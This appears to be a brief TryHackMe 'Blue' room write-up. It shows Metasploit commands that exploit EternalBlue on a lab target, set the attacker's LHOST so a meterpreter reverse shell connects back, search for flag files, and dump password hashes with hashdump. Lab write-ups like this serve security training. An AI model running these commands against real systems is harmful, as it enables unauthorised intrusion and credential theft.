https://tryhackme.com/r/room/blue

---
#### Nmap
![[Screenshot_2024-05-11_19-56-35.png]]
Like shown in the title of the challenge, it's all about the Eternal Blue exploit discovered by NSA

I then found an exploit in `msfconsole`  by searching `eternal blue'
```shell
search eternal blue
```

I had to set up the `RHOSTS` with the target ip and the `LHOST` with my local ip provided by THM's vpn
```shell
set RHOSTS 10.10.62.238
set LHOST 10.14.79.56
run
```

It created a meterpreter (enhanced reverse shell). With that I was able the easily find the 3 flags with this command
```shell
search -f *flag*.txt
```

And I found the credentials with `hashdump`

